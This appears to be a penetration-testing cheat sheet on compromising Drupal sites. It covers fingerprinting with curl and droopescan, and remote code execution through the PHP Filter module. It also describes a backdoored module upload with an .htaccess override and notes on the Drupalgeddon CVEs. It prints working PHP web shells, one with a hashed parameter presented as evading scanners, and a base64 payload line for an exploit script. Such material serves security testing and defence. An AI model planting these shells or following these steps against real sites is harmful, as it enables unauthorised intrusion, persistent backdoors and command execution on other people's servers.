# Drupal
## 1. Discovery and Fingerprinting
Before assessing specific vulnerabilities, you must confirm the CMS type and version. Drupal often reveals its presence through HTTP headers, meta tags, or specific file structures.
- **Version Identification:** Use `curl` to check the `Generator` meta tag or specific text files like `CHANGELOG.txt`. Note that administrators often disable or restrict access to these files to hide version information.
- **Automated Scanning:** Tools like `droopescan` can identify plugins, themes, and versions by analyzing static files and hash discrepancies.
```shell
# Check Generator tag
curl -s http://target.local | grep Drupal

# Check Changelog for version
curl -s http://target.local/CHANGELOG.txt | grep -m2 ""

# Automated scan
droopescan scan drupal -u http://target.local
```
## 2. Authenticated Remote Code Execution (RCE)
If you have administrative access (either legitimately or obtained via credential dumping/SQL injection), Drupal offers built-in mechanisms that can be abused to execute system commands.
### Method A: The PHP Filter Module
Drupal has a module called `PHP Filter` that allows administrators to embed PHP snippets directly into content nodes (pages, posts).
1. **Enable the Module:**
    - **Drupal 7 (and older):** Usually installed by default but disabled. Go to **Modules**, find `PHP Filter`, enable it, and save.
    - **Drupal 8+:** Removed from core. It must be manually downloaded (`wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`) and installed via the **Extend** menu.
2. **Create Malicious Content:**
    - Navigate to **Content** -> **Add Content** -> **Basic Page**.
    - Select `PHP code` from the "Text format" dropdown.
    - Inject a web shell into the body. Using complex parameter names (like an MD5 hash) helps avoid accidental detection by automated scanners.
3. **Execution:** Save the page and navigate to it. Append your parameter to the URL to execute commands.
```php
<?php
// Example of a stealthier web shell using a hash parameter
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
### Method B: Uploading a Backdoored Module
Drupal allows admins to install plugins (modules) via archive upload. An attacker can download a legitimate module, inject a shell, and upload it.
1. **Download Legitimate Module:** Fetch a standard module like `CAPTCHA` from the Drupal website.
2. **Inject Backdoor:** Extract the archive and create a PHP shell file inside the folder.
3. **Bypass Access Controls:** Drupal protects the `/modules` directory with `.htaccess`. You may need to add a new `.htaccess` file in your malicious module folder to override these restrictions.
4. **Repackage and Install:** Compress the folder back into a `.tar.gz`, upload it via the "Install new module" feature, and access the shell directly via URL (e.g., `/modules/captcha/shell.php`).

**.htaccess Override Example:**
```txt
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
## 3. Leveraging Known Vulnerabilities (Drupalgeddon)
"Drupalgeddon" refers to a series of critical vulnerabilities in Drupal Core. These are logic flaws, meaning they often bypass standard WAFs that look for typical SQL or XSS signatures.
### Drupalgeddon 1 (CVE-2014-3704)
- **Type:** Pre-authenticated SQL Injection.
- **Mechanism:** Flaw in the database abstraction API handling of arrays.
- **Impact:** Allows attackers to manipulate SQL queries without authentication, typically used to overwrite the administrative password hash or create a new administrator session.
### Drupalgeddon 2 (CVE-2018-7600)
- **Type:** Unauthenticated Remote Code Execution.
- **Mechanism:** Vulnerability in the Drupal **Form API**. Drupal uses "Render Arrays" to render data. This vulnerability allows an attacker to inject specific properties (beginning with `#`) into a form structure (like `#post_render`, `#markup`, etc.).
- **Exploitation:** By injecting these properties during an AJAX request (e.g., user registration), the attacker forces the server to render malicious code, resulting in RCE.

**Example Exploitation Steps:**
1. **Verify:** Check if the site is vulnerable by attempting to write a harmless text file.
2. **Weaponize:** Create a PHP shell payload encoded in Base64.
3. **Execute:** Use an exploit script to inject the payload via the Form API, writing the shell to the webroot.
```shell
# Example payload generation for the exploit script
echo '<?php system($_GET[cmd]);?>' | base64
```
### Drupalgeddon 3 (CVE-2018-7602)
- **Type:** Authenticated Remote Code Execution.
- **Mechanism:** Related to CVE-2018-7600 but affects validation and deletion contexts.
- **Requirement:** The attacker needs a valid session cookie and permissions to delete a node (page/article).
- **Exploitation:** Often automated via tools like Metasploit (`exploit/multi/http/drupal_drupageddon3`), requiring the session cookie and a target Node ID.